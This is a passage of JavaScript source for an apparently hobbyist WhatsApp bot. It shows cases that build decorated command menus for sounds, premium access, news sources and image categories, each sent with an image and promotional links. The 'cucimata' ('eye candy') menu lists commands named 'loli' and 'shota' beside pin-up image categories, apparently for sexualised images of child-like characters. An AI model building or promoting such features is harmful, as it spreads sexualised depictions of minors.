┃➟ 𝒉𝒐𝒍𝒐𝒈𝒓𝒂𝒑𝒉𝒊𝒄
┃➟ 𝒕𝒆𝒙𝒕1917
┃➟ 𝒎𝒊𝒏𝒊𝒐𝒏
┃➟ 𝒅𝒆𝒍𝒖𝒙𝒆𝒔𝒊𝒍𝒗𝒆𝒓
┃➟ 𝒏𝒆𝒘𝒚𝒆𝒂𝒓𝒄𝒂𝒓𝒅
┃➟ 𝒃𝒍𝒐𝒐𝒅𝒇𝒓𝒐𝒔𝒕𝒆𝒅
┃➟ 𝒉𝒂𝒍𝒍𝒐𝒘𝒆𝒆𝒏
┃➟ 𝒋𝒐𝒌𝒆𝒓𝒍𝒐𝒈𝒐
┃➟ 𝒇𝒊𝒓𝒆𝒘𝒐𝒓𝒌𝒔𝒑𝒂𝒓𝒌𝒍𝒆
┃➟ 𝒏𝒂𝒕𝒖𝒓𝒆𝒍𝒆𝒂𝒗𝒆𝒔
┃➟ 𝒃𝒐𝒌𝒆𝒉
┃➟ 𝒕𝒐𝒙𝒊𝒄
┃➟ 𝒔𝒕𝒓𝒂𝒘𝒃𝒆𝒓𝒓𝒚
┃➟ 𝒃𝒐𝒙3𝒅
┃➟ 𝒓𝒐𝒂𝒅𝒘𝒂𝒓𝒏𝒊𝒏𝒈
┃➟ 𝒃𝒓𝒆𝒂𝒌𝒘𝒂𝒍𝒍
┃➟ 𝒊𝒄𝒆𝒄𝒐𝒍𝒅
┃➟ 𝒍𝒖𝒙𝒖𝒓𝒚
┃➟ 𝒄𝒍𝒐𝒖𝒅
┃➟ 𝒔𝒖𝒎𝒎𝒆𝒓𝒔𝒂𝒏𝒅
┃➟ 𝒉𝒐𝒓𝒓𝒐𝒓𝒃𝒍𝒐𝒐𝒅
┃➟ 𝒕𝒉𝒖𝒏𝒅𝒆𝒓
┃┗━━━━━━━━━━━━━━━━━━━
┃ ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻༔༐༑', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'listmusik': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━
┃
┃━━━━━「 𝐒𝐎𝐔𝐍𝐃 」━━━━
┃
┃┏⊱ 𝐋𝐈𝐒𝐓 𝐒𝐎𝐔𝐍𝐃
┃➟ 𝐬𝐨𝐮𝐧𝐝1
┃➟ 𝐬𝐨𝐮𝐧𝐝2
┃➟ 𝐬𝐨𝐮𝐧𝐝3
┃➟ 𝐬𝐨𝐮𝐧𝐝4
┃➟ 𝐬𝐨𝐮𝐧𝐝5
┃➟ 𝐬𝐨𝐮𝐧𝐝6
┃➟ 𝐬𝐨𝐮𝐧𝐝7
┃➟ 𝐬𝐨𝐮𝐧𝐝8
┃➟ 𝐬𝐨𝐮𝐧𝐝9
┃➟ 𝐬𝐨𝐮𝐧𝐝10
┃➟ 𝐬𝐨𝐮𝐧𝐝11
┃➟ 𝐬𝐨𝐮𝐧𝐝12
┃➟ 𝐬𝐨𝐮𝐧𝐝13
┃➟ 𝐬𝐨𝐮𝐧𝐝14
┃➟ 𝐬𝐨𝐮𝐧𝐝15
┃➟ 𝐬𝐨𝐮𝐧𝐝16
┃➟ 𝐬𝐨𝐮𝐧𝐝17
┃➟𝐬𝐨𝐮𝐧𝐝18
┃➟𝐬𝐨𝐮𝐧𝐝18
┃➟𝐬𝐨𝐮𝐧𝐝20
┃➟ 𝐬𝐨𝐮𝐧𝐝21
┃➟ 𝐬𝐨𝐮𝐧𝐝22
┃➟ 𝐬𝐨𝐮𝐧𝐝23
┃➟ 𝐬𝐨𝐮𝐧𝐝24
┃➟ 𝐬𝐨𝐮𝐧𝐝25
┃➟ 𝐬𝐨𝐮𝐧𝐝26
┃➟ 𝐬𝐨𝐮𝐧𝐝27
┃➟ 𝐬𝐨𝐮𝐧𝐝28
┃➟ 𝐬𝐨𝐮𝐧𝐝29
┃➟ 𝐬𝐨𝐮𝐧𝐝30
┃➟ 𝐬𝐨𝐮𝐧𝐝31
┃➟ 𝐬𝐨𝐮𝐧𝐝32
┃➟ 𝐬𝐨𝐮𝐧𝐝33
┃➟ 𝐬𝐨𝐮𝐧𝐝34
┃➟ 𝐬𝐨𝐮𝐧𝐝35
┃➟ 𝐬𝐨𝐮𝐧𝐝36
┃➟ 𝐬𝐨𝐮𝐧𝐝37
┃➟ 𝐬𝐨𝐮𝐧𝐝38
┃➟ 𝐬𝐨𝐮𝐧𝐝39
┃➟ 𝐬𝐨𝐮𝐧𝐝40
┃➟ 𝐬𝐨𝐮𝐧𝐝41
┃➟ 𝐬𝐨𝐮𝐧𝐝42
┃➟ 𝐬𝐨𝐮𝐧𝐝43
┃➟ 𝐬𝐨𝐮𝐧𝐝44
┃➟ 𝐬𝐨𝐮𝐧𝐝45
┃➟ 𝐬𝐨𝐮𝐧𝐝46
┃➟ 𝐬𝐨𝐮𝐧𝐝47
┃➟ 𝐬𝐨𝐮𝐧𝐝48
┃➟ 𝐬𝐨𝐮𝐧𝐝49
┃➟ 𝐬𝐨𝐮𝐧𝐝50
┃➟ 𝐬𝐨𝐮𝐧𝐝51
┃➟ 𝐬𝐨𝐮𝐧𝐝52
┃➟ 𝐬𝐨𝐮𝐧𝐝53
┃➟ 𝐬𝐨𝐮𝐧𝐝54
┃➟ 𝐬𝐨𝐮𝐧𝐝55
┃➟ 𝐬𝐨𝐮𝐧𝐝56
┃➟ 𝐬𝐨𝐮𝐧𝐝57
┃➟ 𝐬𝐨𝐮𝐧𝐝58
┃➟ 𝐬𝐨𝐮𝐧𝐝59
┃➟ 𝐬𝐨𝐮𝐧𝐝60
┃➟ 𝐬𝐨𝐮𝐧𝐝61
┃➟ 𝐬𝐨𝐮𝐧𝐝62
┃➟ 𝐬𝐨𝐮𝐧𝐝63
┃➟ 𝐬𝐨𝐮𝐧𝐝64
┃➟ 𝐬𝐨𝐮𝐧𝐝65
┃➟ 𝐬𝐨𝐮𝐧𝐝66
┃➟ 𝐬𝐨𝐮𝐧𝐝67
┃➟ 𝐬𝐨𝐮𝐧𝐝68
┃➟ 𝐬𝐨𝐮𝐧𝐝69
┃➟ 𝐬𝐨𝐮𝐧𝐝70
┃➟ 𝐬𝐨𝐮𝐧𝐝71
┃➟ 𝐬𝐨𝐮𝐧𝐝72
┃➟ 𝐬𝐨𝐮𝐧𝐝73
┃➟ 𝐬𝐨𝐮𝐧𝐝74
┃➟ 𝐬𝐨𝐮𝐧𝐝75
┃➟ 𝐬𝐨𝐮𝐧𝐝76
┃➟ 𝐬𝐨𝐮𝐧𝐝77
┃➟ 𝐬𝐨𝐮𝐧𝐝78
┃➟ 𝐬𝐨𝐮𝐧𝐝79
┃➟ 𝐬𝐨𝐮𝐧𝐝80
┃➟ 𝐬𝐨𝐮𝐧𝐝81
┃➟ 𝐬𝐨𝐮𝐧𝐝82
┃➟ 𝐬𝐨𝐮𝐧𝐝83
┃➟ 𝐬𝐨𝐮𝐧𝐝84
┃➟ 𝐬𝐨𝐮𝐧𝐝85
┃➟ 𝐬𝐨𝐮𝐧𝐝86
┃➟ 𝐬𝐨𝐮𝐧𝐝87
┃➟ 𝐬𝐨𝐮𝐧𝐝88
┃➟ 𝐬𝐨𝐮𝐧𝐝89
┃➟ 𝐬𝐨𝐮𝐧𝐝90
┃➟ 𝐬𝐨𝐮𝐧𝐝91
┃➟ 𝐬𝐨𝐮𝐧𝐝92
┃➟ 𝐬𝐨𝐮𝐧𝐝93
┃➟ 𝐬𝐨𝐮𝐧𝐝94
┃➟ 𝐬𝐨𝐮𝐧𝐝95
┃➟ 𝐬𝐨𝐮𝐧𝐝96
┃➟ 𝐬𝐨𝐮𝐧𝐝97
┃➟ 𝐬𝐨𝐮𝐧𝐝98
┃➟ 𝐬𝐨𝐮𝐧𝐝99
┃➟ 𝐬𝐨𝐮𝐧𝐝100
┃➟ 𝐬𝐨𝐮𝐧𝐝101
┃➟ 𝐬𝐨𝐮𝐧𝐝102
┃➟ 𝐬𝐨𝐮𝐧𝐝103
┃➟ 𝐬𝐨𝐮𝐧𝐝104
┃➟ 𝐬𝐨𝐮𝐧𝐝105
┃➟ 𝐬𝐨𝐮𝐧𝐝106
┃➟ 𝐬𝐨𝐮𝐧𝐝107
┃➟ 𝐬𝐨𝐮𝐧𝐝108
┃➟ 𝐬𝐨𝐮𝐧𝐝109
┃➟ 𝐬𝐨𝐮𝐧𝐝110
┃➟ 𝐬𝐨𝐮𝐧𝐝111
┃➟ 𝐬𝐨𝐮𝐧𝐝112
┃➟ 𝐬𝐨𝐮𝐧𝐝113
┃➟ 𝐬𝐨𝐮𝐧𝐝114
┃➟ 𝐬𝐨𝐮𝐧𝐝115
┃➟ 𝐬𝐨𝐮𝐧𝐝116
┃➟ 𝐬𝐨𝐮𝐧𝐝117
┃➟ 𝐬𝐨𝐮𝐧𝐝118
┃➟ 𝐬𝐨𝐮𝐧𝐝119
┃➟ 𝐬𝐨𝐮𝐧𝐝120
┃➟ 𝐬𝐨𝐮𝐧𝐝121
┃➟ 𝐬𝐨𝐮𝐧𝐝122
┃➟ 𝐬𝐨𝐮𝐧𝐝123
┃➟ 𝐬𝐨𝐮𝐧𝐝124
┃➟ 𝐬𝐨𝐮𝐧𝐝125
┃➟ 𝐬𝐨𝐮𝐧𝐝126
┃➟ 𝐬𝐨𝐮𝐧𝐝127
┃➟ 𝐬𝐨𝐮𝐧𝐝128
┃➟ 𝐬𝐨𝐮𝐧𝐝129
┃➟ 𝐬𝐨𝐮𝐧𝐝130
┃➟ 𝐬𝐨𝐮𝐧𝐝131
┃➟ 𝐬𝐨𝐮𝐧𝐝132
┃➟ 𝐬𝐨𝐮𝐧𝐝133
┃➟ 𝐬𝐨𝐮𝐧𝐝134
┃➟ 𝐬𝐨𝐮𝐧𝐝135
┃➟ 𝐬𝐨𝐮𝐧𝐝136
┃➟ 𝐬𝐨𝐮𝐧𝐝137
┃➟ 𝐬𝐨𝐮𝐧𝐝138
┃➟ 𝐬𝐨𝐮𝐧𝐝139
┃➟ 𝐬𝐨𝐮𝐧𝐝140
┃➟ 𝐬𝐨𝐮𝐧𝐝141
┃➟ 𝐬𝐨𝐮𝐧𝐝142
┃➟ 𝐬𝐨𝐮𝐧𝐝143
┃➟ 𝐬𝐨𝐮𝐧𝐝144
┃➟ 𝐬𝐨𝐮𝐧𝐝145
┃➟ 𝐬𝐨𝐮𝐧𝐝146
┃➟ 𝐬𝐨𝐮𝐧𝐝147
┃➟ 𝐬𝐨𝐮𝐧𝐝148
┃➟ 𝐬𝐨𝐮𝐧𝐝149
┃➟ 𝐬𝐨𝐮𝐧𝐝150
┃➟ 𝐬𝐨𝐮𝐧𝐝151
┃➟ 𝐬𝐨𝐮𝐧𝐝152
┃➟ 𝐬𝐨𝐮𝐧𝐝153
┃➟ 𝐬𝐨𝐮𝐧𝐝154
┃➟ 𝐬𝐨𝐮𝐧𝐝155
┃➟ 𝐬𝐨𝐮𝐧𝐝156
┃➟ 𝐬𝐨𝐮𝐧𝐝157
┃➟ 𝐬𝐨𝐮𝐧𝐝158
┃➟ 𝐬𝐨𝐮𝐧𝐝159
┃➟ 𝐬𝐨𝐮𝐧𝐝160
┃➟ 𝐬𝐨𝐮𝐧𝐝161
┃┗━━━━━━━━━━━━━━━━━
┃   ➥❰*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024*❱➥
┗━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻༔༐༑', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'addmenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━
┃➥➥➥➥➥⧠ 𝗕𝗬 𝗦𝗔𝗠 ⧠➥➥➥➥➥
┃━━━━━━━━━━━━━━━━━━━
┃
┃┏━━━━━ 𝑨𝑫𝑫 𝑴𝑬𝑵𝑼 ━━━━━
┃➟ 𝒔𝒆𝒕𝒄𝒎𝒅
┃➟ 𝒅𝒆𝒍𝒄𝒎𝒅
┃➟ 𝒍𝒊𝒔𝒕𝒄𝒎𝒅
┃➟ 𝒔𝒆𝒕𝒑𝒑𝒃𝒐𝒕
┃➟ 𝒂𝒅𝒅𝒑𝒅𝒇
┃➟ 𝒅𝒆𝒍𝒑𝒅𝒇
┃➟ 𝒍𝒊𝒔𝒕𝒑𝒅𝒇
┃➟ 𝒚𝒐𝒑𝒅𝒇
┃➟ 𝒔𝒆𝒏𝒅𝒑𝒅𝒇
┃➟ 𝒂𝒅𝒅𝒛𝒊𝒑
┃➟ 𝒅𝒆𝒍𝒛𝒊𝒑
┃➟ 𝒍𝒊𝒔𝒕𝒛𝒊𝒑
┃➟ 𝒚𝒐𝒛𝒊𝒑
┃➟ 𝒔𝒆𝒏𝒅𝒛𝒊𝒑
┃➟ 𝒂𝒅𝒅𝒂𝒑𝒌
┃➟ 𝒅𝒆𝒍𝒂𝒑𝒌
┃➟ 𝒍𝒊𝒔𝒕𝒂𝒑𝒌
┃➟ 𝒚𝒐𝒂𝒑𝒌
┃➟ 𝒔𝒆𝒏𝒅𝒂𝒑𝒌
┃➟ 𝒂𝒅𝒅𝒗𝒏
┃➟ 𝒅𝒆𝒍𝒗𝒏
┃➟ 𝒍𝒊𝒔𝒕𝒗𝒏
┃➟ 𝒂𝒅𝒅𝒎𝒔𝒈
┃➟ 𝒔𝒆𝒏𝒅𝒍𝒊𝒔𝒕
┃➟ 𝒍𝒊𝒔𝒕𝒎𝒔𝒈
┃➟ 𝒅𝒆𝒍𝒎𝒔𝒈
┃➟ 𝒈𝒆𝒕𝒎𝒔𝒈
┃┗━━━━━━━━━━━━━━━━━━━━
┃  ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'cucimata': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━
┃━━━━━━━  𝐂𝐔𝐂𝐈𝐌𝐀𝐓 ━━━━━
┃
┃┏⊱ 𝐂𝐔𝐂𝐈𝐌𝐀𝐓𝐀
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐢𝐧𝐝𝐨
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐜𝐡𝐢𝐧𝐚
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐡𝐢𝐣𝐚𝐛𝐞𝐫
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐦𝐚𝐥𝐚𝐲𝐬𝐢𝐚
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐯𝐢𝐞𝐭𝐧𝐚𝐦
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐤𝐨𝐫𝐞𝐚
┃➟ 𝐜𝐞𝐜𝐚𝐧𝐣𝐞𝐩𝐚𝐧
┃➟ 𝐜𝐞𝐜𝐚𝐧
┃➟ 𝐚𝐫𝐭
┃➟ 𝐚𝐰𝐨𝐨
┃➟ 𝐛𝐭𝐬
┃➟ 𝐜𝐨𝐠𝐚𝐧
┃➟ 𝐞𝐥𝐚𝐢𝐧𝐚
┃➟ 𝐞𝐱𝐨
┃➟ 𝐞𝐥𝐟
┃➟ 𝐞𝐬𝐭𝐞𝐭𝐢𝐜
┃➟ 𝐤𝐚𝐧𝐧𝐚
┃➟ 𝐥𝐨𝐥𝐢
┃➟ 𝐧𝐞𝐤𝐨2
┃➟ 𝐰𝐚𝐢𝐟𝐮
┃➟ 𝐬𝐡𝐨𝐭𝐚
┃➟ 𝐡𝐮𝐬𝐛𝐮
┃➟ 𝐬𝐚𝐠𝐢𝐫𝐢
┃➟ 𝐬𝐡𝐢𝐧𝐨𝐛𝐮
┃➟ 𝐦𝐞𝐠𝐮𝐦𝐢𝐧
┃➟ 𝐰𝐚𝐥𝐥𝐧𝐢𝐦𝐞
┃➟ 𝐪𝐮𝐨𝐭𝐞𝐬𝐢𝐦𝐚𝐠𝐞
┃➟ 𝐧𝐞𝐤𝐨
┃➟ 𝐰𝐚𝐢𝐟𝐮
┃➟ 𝐤𝐢𝐥𝐥
┃➟ 𝐩𝐚𝐭
┃➟ 𝐥𝐢𝐜𝐤
┃➟ 𝐛𝐢𝐭𝐞
┃➟ 𝐲𝐞𝐞𝐭
┃➟ 𝐛𝐨𝐧𝐤
┃➟ 𝐰𝐢𝐧𝐤
┃➟ 𝐩𝐨𝐤𝐞
┃➟ 𝐧𝐨𝐦
┃➟ 𝐬𝐥𝐚𝐩
┃➟ 𝐬𝐦𝐢𝐥𝐞
┃➟ 𝐰𝐚𝐯𝐞
┃➟ 𝐛𝐥𝐮𝐬𝐡
┃➟ 𝐬𝐦𝐮𝐠
┃➟ 𝐠𝐥𝐨𝐦𝐩
┃➟ 𝐡𝐚𝐩𝐩𝐲
┃➟ 𝐝𝐚𝐧𝐜𝐞
┃➟ 𝐜𝐫𝐢𝐧𝐠𝐞
┃➟ 𝐡𝐢𝐠𝐡𝐟𝐢𝐯𝐞
┃➟ 𝐡𝐚𝐧𝐝𝐡𝐨𝐥𝐝
┃┗━━━━━━━━━━━━━━━━━━━
┃ ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '༐⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂⸙⫺', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'beritamenu': {

                            ewe = `┏━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━
┃
┃┏━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━
┃
┃━━━━━「 𝑳𝑰𝑺𝑻 𝑩𝑬𝑹𝑰𝑻𝑨 」━━━━
┃
┃┏⊱ 𝑳𝑰𝑺𝑻 𝑩𝑬𝑹𝑰𝑻𝑨
┃➟ 𝒇𝒂𝒋𝒂𝒓
┃➟ 𝒄𝒏𝒏
┃➟ 𝒍𝒂𝒚𝒂𝒓𝒌𝒂𝒄𝒂
┃➟ 𝒄𝒏𝒃𝒄
┃➟ 𝒕𝒓𝒊𝒃𝒖𝒏
┃➟ 𝒊𝒏𝒅𝒐𝒛𝒐𝒏𝒆
┃➟ 𝒌𝒐𝒎𝒑𝒂𝒔
┃➟ 𝒅𝒆𝒕𝒊𝒌
┃➟ 𝒅𝒂𝒊𝒍𝒚
┃➟ 𝒊𝒏𝒆𝒘𝒔
┃➟ 𝒐𝒌𝒆𝒛𝒐𝒏𝒆
┃➟ 𝒔𝒊𝒏𝒅𝒐
┃➟ 𝒕𝒆𝒎𝒑𝒐
